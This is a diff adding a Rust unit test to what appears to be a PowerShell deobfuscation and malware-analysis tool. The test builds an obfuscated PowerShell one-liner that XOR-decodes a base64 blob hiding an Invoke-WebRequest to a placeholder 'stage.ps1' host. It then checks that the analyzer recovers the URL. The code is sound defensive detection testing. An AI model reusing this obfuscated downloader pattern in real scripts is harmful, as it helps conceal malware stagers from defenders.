@@ -23228,6 +23228,44 @@ if ($finalScript -ne $null) {{
     }
 
     #[test]
+    fn inline_ps1_xor_base64_function_surfaces_decoded_payload_in_deob() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let url = "https://ps-inline-xor-visible.example/stage.ps1";
+        let decoded = format!("Invoke-WebRequest -Uri {url}");
+        let blob = encode_xor_b64(&decoded, key);
+        let script = format!(
+            r#"powershell "$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);function Unvertically ($pauver,$execute=0) {{$bytes=[Convert]::FromBase64String($pauver);$out=0..($bytes.Length-1)|%{{ $bytes[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};[Text.Encoding]::ASCII.GetString($out)}};Unvertically '{blob}' 1""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "inline xor/base64 URL was not extracted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(url),
+            "decoded inline xor/base64 payload was not surfaced in deobfuscated output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_file_backed_marker_base64_loader_recurses_into_download_trait() {
         use crate::env::{Environment, FsEntry};
         use base64::Engine;
